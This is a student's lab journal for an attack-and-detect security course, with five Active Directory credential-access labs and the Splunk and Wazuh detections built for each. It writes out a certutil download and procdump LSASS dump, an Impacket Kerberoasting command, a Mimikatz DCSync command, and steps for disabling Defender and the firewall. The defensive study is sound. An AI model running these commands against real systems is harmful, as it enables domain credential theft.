# Course Lab Journal
**Course:** Just Hacking / Constructing Defense  
**Domain:** `<REDACTED>`  
**Started:** June 2026

This journal tracks hands-on course labs as they are completed. Each entry records the objective, steps taken, what was observed in telemetry, and any gotchas encountered.

---

## How to Use This Journal

Each lab entry follows this structure:

```
## Lab [N] — [Lab Name]
**Module:** [Course module name]
**Date:** YYYY-MM-DD
**Status:** [ ] In Progress | [x] Complete

### Objective
What the lab is trying to demonstrate or teach.

### Steps Taken
Numbered steps of what was actually done.

### Telemetry / Detections
What showed up in Splunk, Malcolm, or logs.

### Notes & Gotchas
Anything unexpected, fixes required, or lessons learned.
```

---

## Labs

<!-- Add new lab entries below this line -->

---

## Lab 1 — Our Second Shell: Exploring the Network Layer
**Module:** 06 - Our Second Shell  
**Date:** 2026-06-13  
**Status:** [x] Complete (Malcolm analysis done; Splunk queries pending license reset)

### Objective
Use Metasploit's PSExec module to remotely execute a payload on a victim Windows host using valid domain admin credentials, then analyze the resulting network telemetry in Malcolm. The focus is on extracting investigative value from packet captures — NTLM authentication details, JA3/JA4 TLS fingerprints, certificate thumbprints, and connection baselining — even when traffic is encrypted.

### Steps Taken

1. Confirmed victim and attacker host IPs
2. Disabled Windows Defender on victim host via registry key
3. Disabled Windows Firewall on victim host
4. Configured and launched Metasploit PSExec module with x86 payload (x64 payloads fail on ARM64 Windows)
5. Captured traffic on attacker host using tcpdump, uploaded PCAP to Malcolm
6. Analyzed sessions in Arkime

### Telemetry / Detections

**Malcolm / Arkime — NTLM Authentication**

Administrator authenticated from attacker to victim on port 445. Extracted entirely from packet capture with no host-based logging required.

**Malcolm / Arkime — TLS Session Analysis**

- JA3: `0696c16261fe58808f9fa965be137acd`
- JA3s: `ec74a5c51106f0419184d0dd08fb05bc`
- Certificate Thumbprint: `da:9e:2c:b8:93:e7:0d:a1:a2:98:99:98:67:d3:e5:e2:e6:6b:38:45` (self-signed, Metasploit-generated)

### Notes & Gotchas

- Parallels bridged networking via Wi-Fi fails on Apple Silicon — use USB-C Ethernet adapter with dual-adapter setup
- x64 Metasploit payloads fail silently on ARM64 Windows — use x86 payloads
- Malcolm requires manual PCAP upload; does not auto-capture LAN traffic without SPAN port

---

## Lab 2 — Credential Access: LSASS
**Module:** 08 - Credential Access on Windows Hosts - LSASS  
**Date:** 2026-06-17  
**Status:** [ ] Partial — infrastructure issues prevented full completion  
**MITRE:** T1003.001

### Objective
Dump LSASS memory using three methods (Mimikatz/Kiwi via Meterpreter, Task Manager, Procdump), then detect via Sysmon Event ID 10 (process access to LSASS) and Event ID 11 (file creation of dump file).

### Steps Taken

1. Attempted to establish Meterpreter session on victim host via `exploit/windows/smb/psexec` — multiple blockers:
   - Port 443 unavailable — switched to 8443
   - Windows Defender repeatedly re-enabled after reboots despite registry policy — Tamper Protection reasserted control
   - msfvenom exe blocked by Defender IOAV on download even with real-time protection disabled
2. Pivoted to Procdump (no Meterpreter required):
   ```cmd
   certutil -urlcache -f https://live.sysinternals.com/procdump.exe C:\Users\Public\procdump.exe
   C:\Users\Public\procdump.exe -ma lsass.exe C:\Users\Public\lsass.dmp
   ```
   Procdump succeeded and generated an LSASS dump
3. Sysmon on victim host was found stopped — binary missing, service registry pointed to wrong path
4. Multiple uninstall/reinstall attempts failed — driver stuck in registered state; reverted to snapshot
5. Wazuh agent reinstalled but not confirmed active at session end

### Telemetry / Detections

Detection queries not validated — Sysmon not functional during session.

**Target queries for future session:**

```splunk
index=sysmon EventCode=10 TargetImage="*lsass*"
| table _time, SourceImage, TargetImage, GrantedAccess, CallTrace
```

```splunk
index=sysmon EventCode=11
| where match(TargetFilename, "(?i)lsass")
| table _time, Image, TargetFilename
```

### Notes & Gotchas

- **Defender + Tamper Protection is the primary blocker** — must disable Tamper Protection manually in Windows Security UI before registry-based disablement will stick
- **Sysmon binary path must match service registry** — ARM64 Parallels hosts require `Sysmon64a.exe`; wrong path causes service failure
- **SysmonDrv stuck in registered state** — full snapshot revert more reliable than manual driver removal
- **Procdump works without a shell** — useful fallback when Meterpreter delivery is blocked

---

## Lab 3 — Credential Access: Kerberoasting
**Module:** 10 - Credential Access on Windows Hosts - Kerberoasting  
**Date:** 2026-06-19  
**Status:** [x] Complete  
**MITRE:** T1558.003

### Objective
Execute a Kerberoasting attack using Impacket's GetUserSPNs.py to request TGS tickets for service accounts, then detect via Windows Event ID 4769 (Kerberos Service Ticket Request) filtering for RC4 encryption type.

### Steps Taken

1. Created Kerberoast OU and 8 service accounts on DC with HTTP SPNs
2. Set `msDS-SupportedEncryptionTypes = 28` on all accounts (required to allow RC4 ticket requests — blank value resolves to AES-only on Server 2019)
3. Restored DC audit policy (had been wiped to "No Auditing" across all subcategories)
4. Installed Impacket on attacker host via pipx
5. Executed Kerberoasting:
   ```bash
   GetUserSPNs.py <REDACTED>/Administrator:<REDACTED> -dc-ip <DC IP> -outputfile /tmp/kerbtickets.txt -request
   ```
   Successfully requested TGS tickets for all 8 service accounts
6. Validated Event ID 4769 in Wazuh and Splunk
7. Uploaded PCAP to Malcolm for Zeek Kerberos session analysis

### Telemetry / Detections

**Wazuh — Kerberoasting Detection (Event ID 4769)**

```
data.win.system.eventID: 4769 AND data.win.eventdata.sessionKeyEncryptionType: 0x17
```
`0x17` = RC4-HMAC — the downgrade indicator. All 8 service account TGS requests confirmed.

**Splunk — Kerberoasting Detection**

```splunk
index=winlogs EventCode=4769
| where TicketEncryptionType="0x17"
| stats count by Account_Name, Service_Name, Client_Address
```

**Malcolm / Zeek** — Kerberos sessions confirmed between attacker and DC on port 88.

### Notes & Gotchas

- **`msDS-SupportedEncryptionTypes` must be set to 28** — blank value causes `KDC_ERR_ETYPE_NOSUPP`; Impacket produces no tickets
- **DC audit policy was wiped** — check `auditpol /get /category:*` before any detection lab if events aren't appearing
- **Wazuh archives vs alerts:** Always query `wazuh-archives-*` for custom detections — `wazuh-alerts-*` only contains rule-matched events
- **`data.win.system.eventID` field:** Use without `.keyword` suffix in Wazuh DQL

---

## Lab 4 — Credential Access: File Shares
**Module:** 09 - Credential Access on Windows Hosts - File Shares  
**Date:** 2026-06-21  
**Status:** [x] Complete  
**MITRE:** T1552.001, T1135, T1039

### Objective
Detect credential access through SMB file shares using Windows Event ID 5145 (Detailed File Share audit). Create test shares and a low-privileged user, run Snaffler to enumerate shares and find sensitive files, then build detections for sensitive file access and high-volume share enumeration failures.

### Steps Taken

1. Enabled Detailed File Share auditing on DC (not enabled by default):
   ```powershell
   auditpol /set /subcategory:"Detailed File Share" /success:enable /failure:enable
   ```
2. Created `lowpriv` AD user denied access to test shares
3. Created 15 test SMB shares on DC
4. Created `passwords.txt` in a share as a sensitive file target
5. Validated three distinct 5145 telemetry patterns: granted access, denied access, and file-level access
6. Ran Snaffler v1.0.126 as Administrator — found passwords.txt plus real findings including `unattend.xml` with credential material from OS installation
7. Ran Snaffler as `lowpriv` — generated bulk failure telemetry against all 15 denied shares
8. Validated all detections in Wazuh (Splunk hard-blocked)

### Telemetry / Detections

**Wazuh — Sensitive File Access**
```
data.win.system.eventID: 5145 AND data.win.eventdata.relativeTargetName: *password*
```
19 hits — caught passwords.txt plus Splunk remote-password-management files from Snaffler C$ crawl.

**Wazuh — Share Enumeration by Account**
```
data.win.system.eventID: 5145 AND data.win.eventdata.subjectUserName: lowpriv
```
116 hits — histogram spike matches Snaffler run timing exactly.

### Notes & Gotchas

- **Event ID 5145 requires manual auditpol enablement** — off by default
- **Snaffler v1.0.126 required** — latest version broken at time of course writing
- **Real finding:** `unattend.xml` at `ADMIN$\Panther\` contained credential material from OS install — genuine discovery
- **Splunk hard-blocked** — license cap hit too many times; all queries run in Wazuh

---

## Lab 5 — Credential Access: DCSync
**Module:** 11 - Credential Access on Windows Hosts - DCSync  
**Date:** 2026-06-21  
**Status:** [x] Complete  
**MITRE:** T1003.006

### Objective
Execute a DCSync attack using Mimikatz to replicate Active Directory credentials from the domain controller, then detect via Event ID 4662 correlated with Event ID 4624 to identify the source as a workstation.

### Steps Taken

1. Enabled Directory Service Access auditing on DC:
   ```powershell
   auditpol /set /subcategory:"Directory Service Access" /success:enable /failure:enable
   ```
2. Downloaded and extracted Mimikatz to attacker workstation
3. Executed DCSync:
   ```
   lsadump::dcsync /domain:<REDACTED> /user:Administrator
   ```
4. Queried Wazuh for 4662 with DCSync GUID, correlated with 4624 via logon ID

### Telemetry / Detections

**Wazuh — DCSync Detection (Event ID 4662)**
```
data.win.system.eventID: 4662 AND data.win.eventdata.properties: *1131f6ad*
```
1 hit — GUID `{1131f6ad-9c07-11d1-f79f-00c04fc2dcd2}` (DS-Replication-Get-Changes-All) confirmed.

**Wazuh — Logon Correlation (Event ID 4624)**
```
data.win.system.eventID: 4624 AND data.win.eventdata.targetLogonId: <logon ID from 4662>
```
1 hit — source IP confirmed as attacker workstation (not a DC). Kerberos, Logon Type 3. Workstation performing AD replication = confirmed DCSync.

### Notes & Gotchas

- **Event ID 4662 requires manual auditpol enablement** — `Directory Service Access` off by default
- **Malcolm network detection skipped** — `zeek.notice.msg == drsuapi::DRSGetNCChanges` would detect at network layer but requires live PCAP capture

---

<!-- Template for future labs — copy and paste below -->
<!--
## Lab N — [Lab Name]
**Module:**  
**Date:**  
**Status:** [ ] In Progress

### Objective


### Steps Taken
1. 

### Telemetry / Detections


### Notes & Gotchas

-->
